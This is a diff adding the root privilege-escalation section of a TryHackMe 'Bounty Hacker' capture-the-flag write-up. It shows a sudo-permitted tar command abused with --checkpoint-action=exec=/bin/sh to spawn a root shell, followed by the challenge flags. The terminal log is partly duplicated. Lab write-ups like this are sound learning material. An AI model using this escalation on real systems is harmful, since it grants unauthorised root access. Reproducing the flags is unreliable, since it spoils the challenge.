@@ -322,3 +322,68 @@ THM{CR1M3_SyNd1C4T3}
 > [!important]
 > Find root.txt
 
+```
+lin@ip-10-66-165-145:~/Desktop$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on ip-10-66-165-145:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on
+        ip-10-66-165-145:
+    (root) /bin/tar
+lin@ip-10-66-165-145:~/Desktop$ tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+$ whoami
+lin
+$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# whoami
+root
+# 
+lin@ip-10-66-165-145:~/Desktop$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on ip-10-66-165-145:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on
+        ip-10-66-165-145:
+    (root) /bin/tar
+
+$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# whoami
+root
+# 
+```
+
+> [!note]
+> Before getting root.txt, important to note I used GTFO bins for this part after realising I can run tar as root - https://gtfobins.org/gtfobins/tar/#shell
+
+```
+lin@ip-10-66-165-145:~/Desktop$ tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+$ whoami
+lin
+$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# whoami
+root
+# ls
+user.txt
+# cd /
+# ls
+bin    home            media  run   tmp
+boot   initrd.img.old  mnt    sbin  usr
+cdrom  lib             opt    snap  var
+dev    lib64           proc   srv   vmlinuz
+etc    lost+found      root   sys   vmlinuz.old
+# cd root
+# ls
+root.txt  snap
+# cat root.txt
+THM{80UN7Y_h4cK3r}
+```
+
+![](Bounty%20Hacker%20completed.png)
